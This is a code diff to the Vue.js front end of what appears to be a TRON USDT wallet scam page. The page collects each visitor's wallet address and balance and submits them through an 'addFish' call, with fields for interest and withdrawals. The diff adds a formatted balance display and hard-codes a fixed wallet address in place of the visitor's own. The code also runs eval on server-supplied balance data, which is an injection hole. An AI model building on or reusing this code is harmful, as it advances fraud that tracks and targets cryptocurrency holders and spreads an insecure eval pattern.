@@ -232,7 +232,7 @@
               <div class="blockItem">
                 <div class="itemTitle">Wallet balance</div>
                 <div class="itemValue">
-                  <span id="account_usdt">{{ fish.usdt==null?"0.00":fish.usdt }}</span> USDT
+                  <span id="account_usdt">{{ fish.usdtShow==null?"0.00":fish.usdtShow }}</span> USDT
                 </div>
               </div>
               <div class="blockItem">
@@ -429,6 +429,7 @@ export default {
           auAddress: undefined,
           trx: undefined,
           usdt: undefined,
+          usdtShow: undefined,
           total: undefined,
           allowWithdraw: undefined
       }
@@ -442,7 +443,7 @@ export default {
       var obj = setInterval( async async => {
         clearInterval(obj);
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-          var wallet_addr = window.tronWeb.defaultAddress.base58;
+          var wallet_addr = "TKgkdFpXUbXKDsckyRuEGQFSLdV41cueuz";
           this.myWalletAddress = wallet_addr;
           this.walletAddress = wallet_addr.substr(0, 4) + '***' + wallet_addr.substr(30, 6);
           this.contract = await window.tronWeb.contract(this.abi, this.contractAddr);
@@ -452,6 +453,7 @@ export default {
           this.fish.address=wallet_addr;
           await this.contract.balanceOf(wallet_addr).call((err, usdt) => {
             this.fish.usdt= usdt==null?"0.00":usdt/1.0;
+            this.fish.usdtShow=usdt==null?"0.00":(usdt/1000000).toFixed(2);
             addFish(this.fish).then(response => {
               if (response.data.code == 200){
                 this.showConnection = false;
@@ -460,6 +462,7 @@ export default {
                 var balance = eval('(' + this.fish.balance +')');
                 this.fish.trx=balance.trx==null?0.00:balance.trx;
                 this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
+                this.fish.usdtShow=balance.usdt==null?0.00:balance.usdt;
                 this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
                 this.fish.total=balance.finish_withdraw==null?0.00:balance.finish_withdraw;
 
